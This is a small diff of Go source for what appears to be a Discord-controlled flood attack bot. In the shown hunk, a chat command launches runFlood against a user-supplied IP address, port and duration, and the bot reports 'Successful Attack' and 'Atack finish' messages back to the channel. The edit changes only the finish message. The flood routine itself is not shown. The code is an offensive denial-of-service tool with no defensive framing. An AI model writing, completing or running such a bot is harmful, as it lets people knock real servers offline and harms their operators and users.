@@ -120,7 +120,7 @@ func main() {
 				s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Successful Attack IP:%s:%d Time: %d ", ip, port, duration))
 				go func() {
 					runFlood(ip, port, duration)
-					s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Atack finish %s:%d finalizado.", ip, port))
+					s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Atack finish %s:%d", ip, port))
 				}()
 				return
 			}
